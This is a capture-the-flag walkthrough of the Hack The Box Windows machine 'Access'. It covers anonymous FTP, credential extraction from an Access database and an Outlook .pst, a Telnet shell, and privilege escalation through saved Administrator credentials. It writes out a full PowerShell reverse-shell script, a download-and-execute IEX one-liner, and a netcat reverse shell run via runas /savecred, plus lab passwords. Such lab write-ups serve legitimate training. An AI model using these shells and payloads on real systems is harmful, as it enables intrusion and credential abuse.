---
title: Access
date: 2025-05-24
categories: [oscp, HTB]
tags: [oscp-preparation, walkthrough, HTB, Windows, mdbtools, .pst, telnet-shell, saved-cred-privesc ] 
image: ac.png
media_subpath: /assets/img/posts/2025-05-24-accessHTB/
---

## Introduction

In this walkthrough, I tackled *Access*, an easy-level Windows machine that demonstrates how devices tied to physical security can have poor digital security hygiene. I started by connecting to the FTP server, which allowed **anonymous login**. Inside, I found a **Microsoft Access database (.mdb)** and a **password-protected ZIP file**. Using `mdbtools`, I read the `.mdb` file and extracted the ZIP password. Upon extracting the ZIP, I retrieved a **.pst (Outlook data)** file, which I converted into an **mbox** format using `readpst`. From the mbox file, I discovered credentials for a user. With these, I successfully gained a shell via **Telnet**. Finally, by leveraging **Credential Manager saved credentials**, I escalated privileges on the machine.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 21

Anonymous access is allowed. 

Under `Backups` directory we can see very big file, I encountered an error while trying to get it, that’s why I shifted to analyzing the other file `Access Control.zip` which was under `Engineers` directory.

Then I found the following post and used [binary transfer](https://stackoverflow.com/questions/37187986/bare-linefeeds-received-in-ascii-mode-warning-when-listing-directory-on-my-ftp)

and got `backup.mdb` too.

### Port 23

We don’t have many things to do with this protocol.

## Web

### Port 80

Version - Microsoft IIS httpd 7.5

![image.png](image%202.png)

**Gobuster scan**

![image.png](image%203.png)

Access is denied to `aspnet_client`.

## Exploitaiton

When trying to decompress the `zip` file with `unzip` it returns error `unsupported compression method 99` which indicates likely zip file is password-protected.

![image.png](image%204.png)

We can see it also from the following command:

```bash
7z e Access\ Control.zip
```

![image.png](image%205.png)

To interact with Microsoft Access Database I downloaded `mdbtools`.

```bash
sudo apt install mdbtools
```

From this website we can see usage of the tool https://github.com/mdbtools/mdbtools.

First I found where passwords are stored analysing the tables.

```bash
mdb-schema backup.mdb > file.txt
```

I found they are stored inside of `auth_user` table, and then used mdbtools command to extract them.

```bash
mdb-json backup.mdb auth_user
```

![image.png](image%206.png)

We can see the passwords are extracted now we can extract a file from password-protected `zip` file using Engineer’s password.

```bash
{"id":25,"username":"admin","password":"admin","Status":1,"last_login":"08/23/18 21:11:47","RoleID":26}
{"id":27,"username":"engineer","password":"access4u@security","Status":1,"last_login":"08/23/18 21:13:36","RoleID":26}
{"id":28,"username":"backup_admin","password":"admin","Status":1,"last_login":"08/23/18 21:14:02","RoleID":26}
security : 4Cc3ssC0ntr0ller
```

I see `.pst` file while searching in Google I found that we can convert `.pst` format to `.mbox` and read it using:

```bash
readpst 'Access Control.pst'
cat 'Access Control.mbox' 
```

![image.png](image%207.png)

Telnet was used before SSH became a standard let’s get a shell using telnet.

```bash
telnet $IP
<username>
password: <password>
```

![image.png](image%208.png)

Now we have a shell as `security` user.

## Privilege Escalation

Let’s get a normal shell using powershell:

```powershell
$client = New-Object System.Net.Sockets.TcpClient("10.10.14.17", 443)
$stream = $client.GetStream()
$buffer = New-Object Byte[] 65536

while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $data = (New-Object System.Text.ASCIIEncoding).GetString($buffer, 0, $bytesRead)
    $result = try { Invoke-Expression $data 2>&1 } catch { $_ }
    $response = $result | Out-String
    $prompt = "PS " + (Get-Location).Path + "> "
    $fullResponse = $response + $prompt
    $sendBytes = [System.Text.Encoding]::ASCII.GetBytes($fullResponse)
    $stream.Write($sendBytes, 0, $sendBytes.Length)
    $stream.Flush()
}

$client.Close()
```

```powershell
START /B "" powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.17/shell.ps1')
```

![image.png](image%209.png)

Checking root directory I see one non-default directory called ZKTeco, and I see it is ZKAcess3.5 inside of directory.

I found the following exploit for it https://www.exploit-db.com/exploits/40323

```
Desc: ZKAccess suffers from an elevation of privileges vulnerability
which can be used by a simple authenticated user that can change the
executable file with a binary of choice. The vulnerability exist due
to the improper permissions, with the 'M' flag (Modify) for 'Authenticated Users'
group.
```

![image.png](image%2010.png)

I have write permissions but for some reason I wasn’t able to put .exe files inside `ZKAccess3.5` directory.

```powershell
(New-Object Net.WebClient).DownloadFile('http://10.10.14.17/reverse.exe','Access.exe')
```

I can’t run `winPEASany.exe` we should do manual enumeration.

I looked at Powershell history file:

```powershell
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

checked cmdkey:

```powershell
cmdkey /list
```

And here I see that Administrator credentials are saved for easy use.

![image.png](image%2011.png)

I am gonna upload nc64.exe file and run netcat reverse shell as Administrator using the following command:

```powershell
runas /savecred /user:ACCESS\Administrator "C:\tools\nc64.exe 10.10.14.17 4443 -e cmd.exe”
```

![image.png](image%2012.png)

And that gave admin level shell.

## Mitigation

- **Disable Anonymous FTP Access:** Prevent unauthorized access by disabling anonymous login on FTP servers.
- **Avoid Storing Sensitive Data in Plaintext:** Encrypt or securely store sensitive files like `.mdb`, `.pst`, and credential archives.
- **Limit Use of Outdated Services:** Replace legacy services like Telnet and FTP with secure alternatives like SSH and SFTP.
- **Enforce Strong Access Controls:** Implement proper file permissions and access restrictions on sensitive directories and services.
- **Clear Saved Credentials:** Regularly audit and remove stored credentials from Windows Credential Manager.
- **Monitor File Shares:** Set up monitoring for access to commonly abused file types (.mdb, .pst, etc.) on shared systems.
